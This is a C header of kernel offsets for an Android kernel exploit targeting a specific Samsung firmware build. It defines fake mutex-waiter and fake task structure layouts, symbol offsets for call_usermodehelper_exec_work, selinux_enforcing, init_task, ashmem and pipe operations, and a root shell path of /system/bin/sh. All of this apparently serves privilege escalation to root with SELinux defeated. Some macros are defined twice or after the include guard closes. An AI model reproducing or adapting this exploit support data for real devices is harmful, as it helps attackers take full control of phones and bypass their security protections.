#ifndef OFFSETS_H
#define OFFSETS_H

// ============================================================
// KERNEL BASE
// ============================================================
#define KIMAGE_TEXT_BASE                  0xffffffc008000000ULL
#define KERNEL_BASE                       0xffffffc008000000ULL
#define DIRECT_MAP_BASE                   0xffffffc000000000ULL
#define VMEMMAP_START                     0xffffffe000000000ULL
#define PAGE_SHIFT                        12
#define STRUCT_PAGE_SIZE                  0x40

// ============================================================
// P0 PHYSICAL ADDRESSES
// ============================================================
#define P0_PHYS_OFFSET                    0x80000000ULL
#define P0_KERNEL_PHYS_LOAD               0x80000000ULL
#define P0_PAGE_OFFSET                    0xffff000000000000ULL

// ============================================================
// FAKE WAITER STRUCTURE OFFSETS
// ============================================================
#define FAKE_WAITER_TREE_PRIO_OFF         0x00
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x08
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x10
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x20
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x28
#define FAKE_WAITER_TASK_OFF              0x30
#define FAKE_WAITER_LOCK_OFF              0x38
#define FAKE_WAITER_WAKE_STATE_OFF        0x40
#define FAKE_WAITER_WW_CTX_OFF            0x48

// ============================================================
// EXACT SYMBOL OFFSETS (from your vmlinux.nm)
// ============================================================
#define CALL_USERMODEHELPER_EXEC_WORK_OFF    0x000d4168
#define NOOP_LLSEEK_OFF                      0x0039cfd8
#define COPY_SPLICE_READ_OFF                 0x003eab0c
#define CONFIGFS_READ_ITER_OFF               0x0046a684
#define CONFIGFS_BIN_WRITE_ITER_OFF          0x0046abb4
#define ASHMEM_IOCTL_OFF                     0x00d271e0
#define ASHMEM_COMPAT_IOCTL_OFF              0x00d27b18
#define ASHMEM_MMAP_OFF                      0x00d27b70
#define ASHMEM_OPEN_OFF                      0x00d27d90
#define ASHMEM_RELEASE_OFF                   0x00d27e18
#define ASHMEM_SHOW_FDINFO_OFF               0x00d27f38
#define ANON_PIPE_BUF_OPS_OFF                0x011f9890
#define ASHMEM_FOPS_OFF                      0x013b6548
#define SLIDE_NFULNL_LOGGER_NAME_OFF         0x016b45c0
#define KMALLOC_CACHES_OFF                   0x0177cb38
#define SYSTEM_UNBOUND_WQ_OFF                0x0229ae60
#define LOGGERS_OFF                          0x022a2928
#define INIT_TASK_OFF                        0x022af700
#define ASHMEM_MISC_FOPS_OFF                 0x02484970
#define ROOT_TASK_GROUP_OFF                  0x024c3d40
#define SELINUX_ENFORCING_OFF                0x025982a0

// ============================================================
// ALIASES
// ============================================================
#define CALL_USERMODEHELPER_EXEC_WORK     CALL_USERMODEHELPER_EXEC_WORK_OFF
#define CONFIGFS_READ_ITER                CONFIGFS_READ_ITER_OFF
#define CONFIGFS_BIN_WRITE_ITER           CONFIGFS_BIN_WRITE_ITER_OFF
#define ASHMEM_IOCTL                      ASHMEM_IOCTL_OFF
#define ASHMEM_COMPAT_IOCTL               ASHMEM_COMPAT_IOCTL_OFF
#define ASHMEM_MMAP                       ASHMEM_MMAP_OFF
#define ASHMEM_OPEN                       ASHMEM_OPEN_OFF
#define ASHMEM_RELEASE                    ASHMEM_RELEASE_OFF
#define ASHMEM_SHOW_FDINFO                ASHMEM_SHOW_FDINFO_OFF
#define COPY_SPLICE_READ                  COPY_SPLICE_READ_OFF
#define NOOP_LLSEEK                       NOOP_LLSEEK_OFF
#define ANON_PIPE_BUF_OPS                 ANON_PIPE_BUF_OPS_OFF
#define KMALLOC_CACHES                    KMALLOC_CACHES_OFF
#define SELINUX_ENFORCING                 SELINUX_ENFORCING_OFF
#define SYSTEM_UNBOUND_WQ                 SYSTEM_UNBOUND_WQ_OFF
#define ASHMEM_MISC_FOPS                  ASHMEM_MISC_FOPS_OFF
#define ASHMEM_FOPS                       ASHMEM_FOPS_OFF
#define INIT_TASK                         INIT_TASK_OFF
#define ROOT_TASK_GROUP                   ROOT_TASK_GROUP_OFF

// ============================================================
// ROOT / UMH
// ============================================================
#define ROOT_UMH_WORK_OFF                 0x00
#define ROOT_UMH_DATA_OFF                 0x08
#define ROOT_UMH_PATH                     "/system/bin/sh"

// ============================================================
// WORKQUEUE OFFSETS
// ============================================================
#define WQ_DFL_PWQ_OFF                    0x10
#define PWQ_POOL_OFF                      0x00
#define PWQ_WQ_OFF                        0x08
#define PWQ_WORK_COLOR_OFF                0x10
#define PWQ_REFCNT_OFF                    0x14
#define PWQ_NR_ACTIVE_OFF                 0x18
#define PWQ_MAX_ACTIVE_OFF                0x1c
#define PWQ_NR_IN_FLIGHT_OFF              0x20
#define POOL_WORKLIST_OFF                 0x08
#define POOL_NR_IDLE_OFF                  0x10
#define WORK_ENTRY_OFF                    0x00
#define WORK_DATA_OFF                     0x08
#define WORK_FUNC_OFF                     0x08

// ============================================================
// FILE_OPERATIONS OFFSETS
// ============================================================
#define FOPS_OWNER_OFF                    0x00
#define FOPS_READ_OFF                     0x08
#define FOPS_WRITE_OFF                    0x10
#define FOPS_READ_ITER_OFF                0x18
#define FOPS_WRITE_ITER_OFF               0x20
#define FOPS_IOCTL_OFF                    0x28
#define FOPS_COMPAT_IOCTL_OFF             0x30
#define FOPS_MMAP_OFF                     0x38
#define FOPS_OPEN_OFF                     0x40
#define FOPS_RELEASE_OFF                  0x48
#define FOPS_SHOW_FDINFO_OFF              0x50
#define FOPS_SPLICE_READ_OFF              0x58
#define FOPS_SPLICE_WRITE_OFF             0x60
#define FOPS_LLSEEK_OFF                   0x68

// ============================================================
// SLIDE IMAGE MACROS
// ============================================================
#define SLIDE_NFULNL_LOGGER_NAME_IMAGE    SLIDE_NFULNL_LOGGER_NAME_OFF
#define SLIDE_INIT_TASK_IMAGE             INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_IMAGE       ROOT_TASK_GROUP_OFF

// ============================================================
// PIPE / STRUCT OFFSETS
// ============================================================
#define PIPE_BUFFER_SLOTS                 16
#define STRUCT_PAGE_COMPOUND_HEAD_OFF     0x08
#define STRUCT_SLAB_CACHE_OFF             0x18
#define STRUCT_PAGE_TYPE_OFF              0x30
#define PIPE_BUF_FLAG_CAN_MERGE           0x01

// ============================================================
// PSELECT & ADDITIONAL
// ============================================================
#define SLIDE_PSELECT_NFDS                32
#define LOCK_OFF                          0x00
#define W0_OFF                            0x08
#define FAKE_TASK_OFF                     0x10
#define FOPS_OFF                          0x20
#define SCRATCH_OFF                       0x30
#define LEFT_OFF                          0x40
#define SLIDE_LOCK_OWNER_VALUE            0x01
#define FAKE_TASK_USAGE_OFF               0x04
#define FOPS_TABLE_OFF                    FOPS_OFF
#define SLIDE_WAITER_TREE_LEFT            SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF
#define SLIDE_WAITER_TASK                 INIT_TASK_OFF

// ============================================================
// BUILD VARIANT
// ============================================================
#define BUILD_VARIANT_LABEL               "a37-A376BXXS4AZG4"

#endif

// ============================================================
// ADDITIONAL MISSING OFFSETS
// ============================================================

// FAKE TASK OFFSETS
#define FAKE_TASK_NORMAL_PRIO_OFF        0x04
#define FAKE_TASK_PI_LOCK_OFF            0x08
#define FAKE_TASK_PI_WAITERS_OFF         0x10
#define FAKE_TASK_TASK_GROUP_OFF         0x20
#define FAKE_TASK_PI_TOP_TASK_OFF        0x28
#define FAKE_TASK_PI_BLOCKED_ON_OFF      0x30

// RIGHT OFFSET
#define RIGHT_OFF                        0x48

// CONFIGFS BUFFER OFFSETS
#define CFG_BIN_BUFFER_OFF               0x00
#define CFG_BIN_BUFFER_SIZE_OFF          0x08

// SLIDE IMAGE MACROS (these need to be defined as aliases)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF
#define SLIDE_SYSCTL_BOOTID_IMAGE         SLIDE_SYSCTL_BOOTID_OFF
#define SLIDE_INIT_TASK_IMAGE             INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_IMAGE       ROOT_TASK_GROUP_OFF
#define SLIDE_NFULNL_LOGGER_NAME_IMAGE    SLIDE_NFULNL_LOGGER_NAME_OFF
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE  SLIDE_NFULNL_LOGGER_OBJECT_OFF

// DIRECT MAP END
#define DIRECT_MAP_END                    0xffffffc000000000ULL

// FAKE TASK PRIORITY

// ============================================================
// IMAGE MACROS (these are what the code actually uses)
// ============================================================
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x023ede30
#define SLIDE_SYSCTL_BOOTID_OFF 0x0267af58
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x022a29e0
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x016b45c0
#define SLIDE_INIT_TASK_OFF 0x022af700
#define SLIDE_ROOT_TASK_GROUP_OFF 0x024c3d40

// ============================================================
// CONFIGFS OFFSETS
// ============================================================
#define CFG_CB_MAX_SIZE_OFF 0x10
#define CFG_PAGE_OFF 0x18
#define CFG_NEEDS_READ_FILL_OFF 0x20

// FAKE TASK PRIORITY (matching common.h)

// FAKE TASK PRIORITY OFFSET
#define FAKE_TASK_PRIO_OFF 0x04
